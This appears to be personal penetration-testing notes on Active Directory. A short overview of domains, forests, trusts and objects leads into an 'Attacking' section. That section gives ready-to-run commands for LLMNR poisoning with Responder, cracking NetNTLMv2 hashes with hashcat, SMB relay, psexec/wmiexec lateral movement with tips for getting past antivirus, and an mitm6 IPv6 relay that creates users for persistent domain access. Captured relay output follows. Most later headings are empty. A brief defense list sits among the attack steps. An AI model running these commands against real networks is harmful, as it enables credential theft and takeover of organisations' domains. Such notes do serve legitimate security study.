# Active Directory:
## Domain Controller
1. hosts a copy of AD Directory Services directory store
2. provide authentication and authorization
3. replicate updates to other domain controllers in the domain and forest
4. allow administrative access to manage user accounts and network resources

## Domains: a way to group and manage objects in an organization
1. an administrative boundary for applying policies to groups of objects
2. a replication boundary for replicating data between domain controllers
3. an authentication and authorization boundary that proveides a way to limit the scope of access to resources. 

## Forest: a collection of one or more domain trees
1. share a common schema
2. share a common configuration partition
3. share a common global catalog to enable searching
4. enable trusts between all domains in the forest
5. share the Enterprise Admins and Schema Admins groups

## Oganizational Unit (OU): OUs are Active Directory containers that can contain users, groups, computers, and other OUs
1. represent your organization hierarchically and logically
2. manage a collection of objects in a consistent way
3. delegate permissions to administer groups of objects
4. apply policies

## Trusts: provide a mechanism for users to gain access to resources in another domain
1. all domians in a forest trust all other domains in the forest
2. trust can extend outside the forest

Directional Trust: the trust direction flows from trusting domain to to trusted domain

Transitive Trust: the trust relationship is extended beyond a two-domain trust to include other trusted domains 

## Objects:
1. User: enables network resource access for a user
2. InetOrgPerson: similar to user account, used for compatibility with other directory services
3. Contacts: Used primarily to assign e-mail addresses to external users, doesn't enable network access
4. Groups: used to simplify the administration of access controls
5. Computers: Enables authentication and auditing of computer access to resources
6. Printers: Used to simplify the process of locating and connecting to printers
7. Shared Folders: enables users to search for shared folders based on properties


**********************

# Attacking:
### Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


## LLMNR Poisoning: 
#### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```
```
-I interface
-r enable answers for netbios wredir suffix queries
-d enable answers for netbios domain suffix queries
-w start the WPAD rogue proxy server
-v verbose
```
save hashses to file called hashes.txt

#### Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


##### LLMNR Poisoning Defense:
1. Disable LLMNR
2. Disable NBT-NS
3. Require Network Access Control
4. Require strong passwords (phrases) more than 14 characters


## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
edit: /usr/share/responder/Responder.conf
```
SMB = Off
HTTP = Off
```
everything else stays on

#### NMAP
check for open SMB port and check for SMB signing
```
sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```
look for smb2 enabled but not required (default for desktops)

### ntmlrelayx.py
1. installed with impacket
2. run while responder is running
```
ntmlrelayx.py -tf targets.txt -smb2support -i
```

```
-i interact
-e example.exe: execute example.exe
-c ls: run command ls
```
looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 

#### connecting: requires having cracked a hash
1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
2. if that is getting stopped by antivirus try psexec.py 
``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
3. if that is getting stopped by antivirus try smbexec.py 
``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
4. if that is getting stopped by antivirus try wmiexec.py 
``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
5. there is also a powershell version of psexec and other options that might be able to do the same thing. 

## IPv6: mitm6
1. install from github
```
cd /opt; git clone https://github.com/fox-it/mitm6.git; cd mitm6
```
2. get Domain Controller IP 
Domain controllers will show port 389 running the Microsoft Windows AD LDAP service:
```
nmap -p389 -sV <IP-range>
```
Expected Output:
```
PORT    STATE SERVICE VERSION 
389/tcp open  ldap    Microsoft Windows AD LDAP (Domain:TESTDOMAIN, Site: TEST) 
```
OR:
```
nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
```
3. get Domain name using nmap
```
nmap --script smb-enum-domains.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
```
OR:
```
nmap --script smb-os-discovery.nse -p445 127.0.0.1
sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
```

4. run mitm6
```
sudo python mitm6.py -d <domain>.local
```

5. run ntmlrelayx.py at the same time
```
ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
```
6. check on results:
all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
```
firefox ./lootme/domain_users.html
```
Always check for passwords in the description. 

#### ntmlrelayx.py output:
```
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user.
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}

```

## DNS take over:


## Domain Enumeration: 
### Powerview: 
### Bloodhound: 


## Pass the hash: 


## CrackMapExec:


## SecretsDump.py:


## Token Impersonation:


## kerberoasting:


## GPP:


## MimiKatz:


## Golden Ticket: 





